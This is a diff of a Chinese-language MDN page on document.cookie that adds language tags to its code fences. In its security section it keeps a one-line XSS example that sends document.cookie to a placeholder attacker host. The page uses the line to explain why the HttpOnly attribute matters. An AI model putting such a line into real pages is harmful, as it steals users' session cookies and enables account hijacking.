@@ -11,7 +11,7 @@ slug: Web/API/Document/cookie
 
 ##### 读取所有可从此位置访问的 Cookie
 
-```
+```js
 allCookies = document.cookie;
 ```
 
@@ -19,7 +19,7 @@ allCookies = document.cookie;
 
 ##### 写一个新 cookie
 
-```
+```js
 document.cookie = newCookie;
 ```
 
@@ -188,7 +188,7 @@ var docCookies = {
 
 ##### 语法
 
-```
+```js-nolint
 docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])
 ```
 
@@ -215,7 +215,7 @@ docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])
 
 ##### 语法
 
-```
+```js-nolint
 docCookies.getItem(name)
 ```
 
@@ -232,7 +232,7 @@ docCookies.getItem(name)
 
 ##### Syntax
 
-```
+```js-nolint
 docCookies.removeItem(name[, path],domain)
 ```
 
@@ -253,7 +253,7 @@ docCookies.removeItem(name[, path],domain)
 
 ##### 语法
 
-```
+```js-nolint
 docCookies.hasItem(name)
 ```
 
@@ -270,7 +270,7 @@ docCookies.hasItem(name)
 
 ##### 语法
 
-```
+```js-nolint
 docCookies.keys()
 ```
 
@@ -320,8 +320,9 @@ alert(docCookies.getItem("test1;="));
 
 Web 应用程序通常使用 cookies 来标识用户身份及他们的登录会话。因此通过窃听这些 cookie，就可以劫持已登录用户的会话。窃听的 cookie 的常见方法包括社会工程和 XSS 攻击 -
 
-```
-(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+```js
+new Image().src =
+  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 ```
 
 `HttpOnly` 属性可以阻止通过 javascript 访问 cookie，从而一定程度上遏制这类攻击。参见 [Cookies and Security](http://www.nczonline.net/blog/2009/05/12/cookies-and-security/).
